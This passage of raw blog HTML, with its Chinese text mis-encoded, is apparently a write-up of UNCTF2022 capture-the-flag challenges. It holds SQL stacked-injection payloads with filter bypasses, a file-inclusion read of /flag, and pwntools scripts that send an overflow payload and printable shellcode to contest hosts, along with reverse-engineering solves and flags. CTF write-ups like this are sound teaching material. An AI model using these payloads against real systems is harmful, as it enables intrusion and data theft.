class="number">1</span>, <span class="number">51</span>);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">2</span>, <span class="number">15</span>);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">3</span>, <span class="number">80</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">4</span>, <span class="number">0x0e5d</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">6</span>, <span class="number">0x323a</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">8</span>, <span class="number">0x3058</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">10</span>, <span class="number">0x1a2a</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint32</span>(<span class="number">12</span>, <span class="number">0x0512160d</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint32</span>(<span class="number">16</span>, <span class="number">0x02560002</span>);</span><br><span class="line">    view.<span class="title function_">setUint32</span>(<span class="number">20</span>, <span class="number">0x130000</span>);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">code</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (code.<span class="property">length</span> !== <span class="number">24</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">let</span> encode = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; code.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (~i % <span class="number">2</span> === <span class="number">0</span>) &#123;</span><br><span class="line">          encode.<span class="title function_">push</span>(code.<span class="title function_">charCodeAt</span>(i) ^ code.<span class="title function_">charCodeAt</span>(i - <span class="number">2</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          encode.<span class="title function_">push</span>(code.<span class="title function_">charCodeAt</span>(i) ^ code.<span class="title function_">charCodeAt</span>(i + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; code.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (view.<span class="title function_">getInt8</span>(i) !== encode[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!!<span class="variable language_">arguments</span>.<span class="property">length</span>) &#123;</span><br><span class="line">        [].<span class="property">push</span>.<span class="title function_">apply</span>(args, <span class="variable language_">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">check</span>(args.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å†™ç®€å•è„šæœ¬è¿˜åŸè¾“å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">68</span>,<span class="number">51</span>,<span class="number">15</span>,<span class="number">80</span>,<span class="number">93</span>,<span class="number">14</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">88</span>,<span class="number">48</span>,<span class="number">42</span>,<span class="number">26</span>,<span class="number">13</span>,<span class="number">22</span>,<span class="number">18</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">86</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line"></span><br><span class="line">t = [-<span class="number">1</span>]*<span class="number">24</span></span><br><span class="line">t[<span class="number">1</span>] = c[<span class="number">1</span>]</span><br><span class="line">t[<span class="number">0</span>] = t[<span class="number">1</span>]^c[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">24</span>,<span class="number">2</span>):</span><br><span class="line">  t[i] = t[i-<span class="number">2</span>]^c[i]</span><br><span class="line">  t[i-<span class="number">1</span>] = t[i]^c[i-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;w3lc0me_7o_unctf2022!!!!&#x27;</span></span><br></pre></td></tr></table></figure><p>å†è§‚å¯Ÿå‘ç°å­˜åœ¨game.wasmï¼Œä½¿ç”¨wabtå·¥å…·é€†wasmå¾—åˆ°å¯†æ–‡ <code>\x22&#125;/7v\x16\x0d&gt;GV&amp;*\x5cS@^mWS_D~V\x10\x03[3\x16^\x0eR9\x05_mG\x10\x1efalse\x00</code>ï¼Œå°è¯•ä¸å‰é¢å¾—åˆ°çš„invite_codeå¼‚æˆ–ï¼Œå¾—åˆ° <code>UNCTF&#123;hap9y_2048_game_w1th_unc7f2022~&#125;..^CW2</code>ã€‚</p><p>â€‹    </p><h3 id="ä¸–ç•Œå’Œå¹³"><a href="#ä¸–ç•Œå’Œå¹³" class="headerlink" title="ä¸–ç•Œå’Œå¹³"></a>ä¸–ç•Œå’Œå¹³</h3><blockquote><p>æç¤º1ï¼šå †å æ³¨å…¥</p></blockquote><p>æ ¹æ®æç¤ºè¿›è¡Œå †å æ³¨å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0;show databases;#</span><br><span class="line">æ•°æ®åº“å score_mbamission/score_minnesotaunited/snert</span><br><span class="line"></span><br><span class="line">0;show tables;# </span><br><span class="line">è¡¨å Flag/users</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>0;select * from Flag</code> æŸ¥æ‰¾Flagè¡¨ä¸­å†…å®¹ï¼Œå‘ç°æ— å›æ˜¾ï¼ŒçŒœæµ‹å¯¹ <code>select</code> æˆ– <code>from</code> æˆ– <code>Flag</code> æœ‰è¿‡æ»¤ã€‚</p><p>å°è¯• <code>0;seLseLectect version();#</code>ï¼Œåªç”¨ <code>select</code> å¤§å†™+åŒå†™å¯ä»¥ç»•è¿‡å¾—åˆ°å†…å®¹ï¼Œåˆ™</p><p>å†ç”¨ <code>0;seLseLectect * fRfRomom FlFlagag;#</code> å³å¯æ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h3 id="å¿«ä¹ä¸‰æ¶ˆ"><a href="#å¿«ä¹ä¸‰æ¶ˆ" class="headerlink" title="å¿«ä¹ä¸‰æ¶ˆ"></a>å¿«ä¹ä¸‰æ¶ˆ</h3><blockquote><p>æ‰“CTFç´¯äº†æ¥ç©ä¸‰æ¶ˆæ”¾æ¾ä¸€ä¸‹å­</p></blockquote><p>æŸ¥çœ‹æºç ï¼Œé™¤äº†è¿›å…¥ <code>/h5/index.php</code> å’Œ <code>/h4/king.php</code>ï¼Œæ²¡æœ‰å…¶ä»–æœ‰ç”¨ä¿¡æ¯ã€‚</p><p>æ‰«ç›®å½•å‘ç° <code>/.git/</code> å’Œ <code>/admin/</code>ï¼Œç”¨GitHackè¿˜åŸå‡º <code>index.php</code> å’Œ <code>phpinfo.php</code>ï¼Œæ— æœ‰ç”¨ä¿¡æ¯ã€‚</p><p>ç”¨ <code>admin/unctf</code> è¿›å…¥åå°é¡µé¢ï¼Œ åœ¨ç½‘é¡µé¢„è§ˆåŠŸèƒ½å‘ç°urlä¸º <code>/admin/fi.php?filename=index.php</code>ï¼Œå°è¯•å‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè®¿é—® <code>/admin/fi.php?filename=/flag</code> å¾—åˆ°flagã€‚</p><p>â€‹    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="# Pwn"></a># Pwn</h2><h3 id="welcomeUNCTF2022"><a href="#welcomeUNCTF2022" class="headerlink" title="welcomeUNCTF2022"></a>welcomeUNCTF2022</h3><blockquote><p>easy easy easy Pwn</p></blockquote><p>ç­¾åˆ°pwnã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">37591</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;UNCTF&amp;2022\x00&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="çŸ³å¤´å‰ªåˆ€å¸ƒ"><a href="#çŸ³å¤´å‰ªåˆ€å¸ƒ" class="headerlink" title="çŸ³å¤´å‰ªåˆ€å¸ƒ"></a>çŸ³å¤´å‰ªåˆ€å¸ƒ</h3><p>ä¼ªéšæœºæ•°ç»„ï¼Œç»™äº†srandç§å­å€¼ï¼Œä¾ç…§ä»£ç é€»è¾‘æ±‚å‡ºå›ºå®šç§å­å€¼ä¸‹çš„100ä¸ªrandå€¼ï¼š</p><p><code>[1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2]</code></p><p>å†æ ¹æ®çŸ³å¤´å‰ªåˆ€å¸ƒè§„åˆ™å®ŒæˆååŠéƒ¨åˆ†äº¤äº’ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">30253</span>)</span><br><span class="line">rand = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">need = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> rand[i] == <span class="number">0</span>:</span><br><span class="line">        need.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> rand[i] == <span class="number">1</span>:</span><br><span class="line">        need.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> rand[i] == <span class="number">2</span>:</span><br><span class="line">        need.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;pwn later?(y/n)\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;]\x1B[0m\n&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(need[i]))</span><br><span class="line">    <span class="built_in">print</span>(i,r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>æµ‹è¯•ç¬¦åˆæ¡ä»¶çš„æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span>    uint32;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD uint32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LODWORD(x)  (*((_DWORD*)&amp;(x)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> nbytes;</span><br><span class="line"><span class="type">char</span> nptr[<span class="number">32</span>]=<span class="string">&quot; -33&quot;</span>;</span><br><span class="line">LODWORD(nbytes) = atoi(nptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,atoi(nptr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,nptr[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> ( atoi(nptr) &gt; <span class="number">32</span> || nptr[<span class="number">0</span>] == <span class="number">0x2D</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No!!Hacker&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,(<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äº¤äº’ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">39482</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name: \n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;size: \n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27; -33&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(<span class="number">0x4008c3</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="int-0x80"><a href="#int-0x80" class="headerlink" title="int 0x80"></a>int 0x80</h3><blockquote><p>easy easy easy Pwn</p></blockquote><p>ret2shellcodeï¼Œå…¶ä¸­çš„ <code>__ctype_b_loc</code> å‡½æ•°çš„ä½œç”¨å¯å‚è€ƒ <code>ctype/ctype.h</code> æºç ï¼Œå°†è¾“å…¥çš„å­—ç¬¦æ ¹æ® </p><p><code>((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8))</code></p><p>è¿›è¡Œå¤„ç†ï¼Œç„¶åæ ¹æ®ä¸‹é¢è¡¨å¯¹åº”çš„å†…å®¹è¿”å›ã€‚å‚è€ƒ <a href="https://blog.csdn.net/yongbaoii/article/details/120446765">2021 å¤©ç¿¼æ¯ pwn ezshell</a>ã€‚</p><p><img src="/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAeW9uZ2Jhb2lp,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" style="zoom:80%;"></p><p><code>s[i] &amp; 0x4000 != 0</code> æ„æ€å³è¦æ±‚çš„è¾“å…¥å­—ç¬¦æ˜¯å¯è§å­—ç¬¦ã€‚</p><p>å‚è€ƒ <a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">mrctf2020_shellcode_revenge</a>ï¼Œä½¿ç”¨å…¨å¯è§å­—ç¬¦shellcodeè¾“å…¥å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">32261</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;h3ll0_w_0_r_1_d&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="# Reverse"></a># Reverse</h2><h3 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h3><blockquote><p>ä½ èƒ½æ‰¾åˆ°å±äºä½ çš„keyå—ï¼Ÿ</p></blockquote><p>ç®€å•æ›¿æ¢åŠ å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">121</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">107</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> s[i] == <span class="number">109</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> s[i] &lt;= <span class="number">110</span>:</span><br><span class="line">    s[i] -= <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> s[i] &gt; <span class="number">111</span>:</span><br><span class="line">    s[i] += <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;yesiamflag&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezzzzre"><a href="#ezzzzre" class="headerlink" title="ezzzzre"></a>ezzzzre</h3><blockquote><p>reç­¾åˆ°é¢˜</p></blockquote><p>exeinfoå‘ç°UPXå£³ï¼Œè„±å£³åï¼ŒIDAä¸­åˆ†æé€»è¾‘ï¼Œé¡ºç€å®ç°å¾—flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;HELLOCTF&#x27;</span>)</span><br><span class="line">out = [<span class="number">2</span>*k-<span class="number">69</span> <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;KESSYAcG&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Sudoku"><a href="#Sudoku" class="headerlink" title="Sudoku"></a>Sudoku</h3><p>æ•°ç‹¬åˆ¤å®šé€»è¾‘ã€‚ç›´æ¥è¿è¡Œæ˜¾ç¤ºçš„æ•°ç‹¬æ˜¯é”™çš„ï¼ŒåŠ¨è°ƒè·å–æ­£ç¡®çš„æ•°ç‹¬åˆå§‹æ•°ç»„ï¼Œæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£äº†åå¡«å…¥ä¸ºï¼š</p><p><code>[8, 5, 2, 4, 9, 1, 6, 7, 3, 1, 9, 6, 7, 3, 8, 2, 5, 4, 4, 3, 7, 5, 6, 2, 9, 1, 8, 5, 2, 8, 1, 4, 6, 3, 9, 7, 3, 7, 4, 9, 2, 5, 8, 6, 1, 9, 6, 1, 3, 8, 7, 4, 2, 5, 2, 1, 9, 8, 5, 4, 7, 3, 6, 7, 4, 3, 6, 1, 9, 5, 8, 2, 6, 8, 5, 2, 7, 3, 1, 4, 9]</code></p><p>ä¾æ¬¡è¾“å…¥åå¾—åˆ°</p><p> <code>Y0u_Ar3_R1ght!Th1s_1s_your_f1aaag!</code></p><p><code>UNCTF&#123;chr(29+vme)chr(15+vme)chr(29+vme)chr(24+vme)chr(39+vme)chr(25+vme)chr(29+vme)chr(20+vme)chr(32+vme)&#125;</code></p><p>å…¶ä¸­ <code>vme=50</code>ï¼Œå³flagï¼š<code>UNCTF&#123;OAOJYKOFR&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="halo"><a href="#halo" class="headerlink" title="halo"></a>halo</h3><p>exeinfoå‘ç°UPXå£³ï¼Œè„±å£³åï¼ŒIDAä¸­åˆ†æé€»è¾‘ï¼Œä¸ºä¸¤è½®å¼‚æˆ–ï¼Œè¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">85</span>,  <span class="number">11</span>, <span class="number">104</span>,  <span class="number">12</span>, <span class="number">115</span>,  <span class="number">62</span>,  <span class="number">12</span>,  <span class="number">58</span>,  <span class="number">93</span>,  <span class="number">27</span>, </span><br><span class="line">   <span class="number">33</span>, <span class="number">117</span>,  <span class="number">79</span>,  <span class="number">32</span>,  <span class="number">76</span>, <span class="number">113</span>,  <span class="number">88</span>, <span class="number">123</span>,  <span class="number">89</span>,  <span class="number">44</span>, </span><br><span class="line">    <span class="number">0</span>, <span class="number">119</span>,  <span class="number">88</span>, <span class="number">119</span>,  <span class="number">14</span>, <span class="number">114</span>,  <span class="number">91</span>,  <span class="number">38</span>,  <span class="number">11</span>, <span class="number">112</span>, </span><br><span class="line">   <span class="number">10</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">119</span>,  <span class="number">54</span>, <span class="number">118</span>,  <span class="number">55</span>, <span class="number">118</span>,  <span class="number">98</span>, <span class="number">114</span>, </span><br><span class="line">  <span class="number">109</span>,  <span class="number">39</span>,  <span class="number">63</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">38</span>]</span><br><span class="line"></span><br><span class="line">s = [s[i]^<span class="number">0x33</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    s[i] ^= s[i-<span class="number">1</span>]^i</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;f_ag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;-&#x27;</span></span><br><span class="line"><span class="comment"># ä¿®æ­£ï¼šflag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="HelloRust"><a href="#HelloRust" class="headerlink" title="HelloRust"></a>HelloRust</h3><blockquote><p>å¿«æ¥é€†é€†è¿™ä¸€å¨ç­”è¾©ç½¢</p></blockquote><p>IDAæ‰“å¼€ï¼Œåˆ†æä»£ç é€»è¾‘ï¼Œè¯†åˆ«ä¸ºRC4ç®—æ³•ï¼Œæ‰¾åˆ°å¯†æ–‡hexå€¼ <code>876927216FC731261B6C3A749A626EA002811D85E0E2D071F4A3090E</code>ï¼Œä»¥åŠkeyå€¼ <code>UnCtF2022</code>ï¼Œ</p><p>ä½¿ç”¨Cyberchefå¾—åˆ°flagæ˜æ–‡ï¼š<code>unctf&#123;Ru5t_Rc4_1s_2_e@zy!!!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ezast"><a href="#ezast" class="headerlink" title="ezast"></a>ezast</h3><blockquote><p>ä½ ä¼šastå—</p></blockquote><p>JavaScriptæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œå®šä½å¯†æ–‡ <code>OTYN\\\\a[inE+iEl.hcEo)ivo+g</code>ï¼Œä¸”ä¸­é—´è¿ç®—åŒ…å«å¼‚æˆ–æ“ä½œï¼Œå°è¯•ä½¿ç”¨Cyberchefå¼‚æˆ–çˆ†ç ´ï¼Œå‘ç°åœ¨key=0x1aæ—¶ï¼Œå¾—åˆ°flagï¼š<code>UNCTF&#123;Ast_1s_v4ry_u3slu1&#125;</code>ã€‚</p><p>â€‹    </p><h3 